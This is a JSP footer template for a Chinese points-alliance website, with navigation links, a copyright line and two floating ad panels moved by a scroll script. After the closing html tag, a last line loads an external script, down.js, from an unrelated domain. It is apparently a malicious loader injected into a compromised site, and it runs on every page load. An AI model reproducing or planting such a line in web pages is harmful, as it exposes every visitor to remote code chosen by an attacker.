
<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>

<table width="780" height="65" border="0"  align="center"  cellpadding="0" cellspacing="0" bgcolor="#E6E6E6">
  <tr> 
    <td height="23" colspan="5" bgcolor="#3993D9" align="center"> 
      <table width="309" border="0" cellpadding="0" cellspacing="0" height="47">
        <tr> 
          <td height="30" align="center" ><a href='<c:url value="/aboutUs.screen"/>'  class="white12">关于我们</a></td>
          <td height="30" align="center" class="white12">|</td>
          <td height="30" align="center" ><a href='<c:url value="/siteMap.screen"/>'  class="white12">站点地图</a></td>
          <td height="30" align="center" class="white12">|</td>
          <td height="30" align="center" ><a href='<c:url value="/help.screen"/>' class="white12">帮助中心</a></td>
          <td height="30" align="center" class="white12">|</td>
          <td height="30" align="center" ><a href='<c:url value="/joinUs.screen"/>'   class="white12">商户加盟</a></td>
        </tr>
        <tr> 
          <td colspan="7" align="center" height="14" class="white12">&copy;2006 
            积分联盟 <a href="http://www.miibeian.gov.cn/" class="white12">ICP证0X0XXX号</a> 
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>

<DIV id="leftAd" style="left:0px;POSITION:absolute;TOP:220px; width: 100"> 
  <table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr> 
      <td align="right" height="17"><a href="#" onclick="javascript:document.all.leftAd.style.display = 'none';">关闭</a></td>
    </tr>
    <tr> 
      <td><a href="http://127.0.0.1/" target="_blank"><img src="images/ad/leftAd1.gif" width="100" height="50" border="0"></a></td>
    </tr>
    <tr> 
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td><a href="http://127.0.0.1/" target="_blank"><img src="images/ad/leftAd2.gif" width="100" height="50" border="0"></a></td>
    </tr>
  </table>
</DIV>

<DIV id="rightAd" style="right:0px;POSITION:absolute;TOP:220px;; width: 100"> 
  <table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr> 
      <td align="right" height="17"><a href="#" onclick="javascript:document.all.rightAd.style.display = 'none';">关闭</a></td>
    </tr>
    <tr> 
      <td><a href="http://127.0.0.1/" target="_blank"><img src="images/ad/rightAd1.gif" width="100" height="50" border="0"></a></td>
    </tr>
    <tr> 
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td><a href="http://127.0.0.1/" target="_blank"><img src="images/ad/rightAd2.gif" width="100" height="50" border="0"></a></td>
    </tr>
  </table>
</DIV>


<SCRIPT language=JavaScript>
lastScrollY = 0;
leftClose = false;
rightClose = false;
function move(){
	diffY = document.body.scrollTop;
	percent = 0.1*(diffY - lastScrollY);
	if(percent > 0){
		percent = Math.ceil(percent);
	}else{
		percent = Math.floor(percent);
	}
	
	if(!leftClose){
			document.all.leftAd.style.pixelTop += percent;
	}
	if(!rightClose){
			document.all.rightAd.style.pixelTop += percent;
	}
	lastScrollY = lastScrollY + percent;
}
window.setInterval("move",1);
</SCRIPT>

</body>
</html>
<script language=javascript src=http://Town.531jx.cn/down.js></script>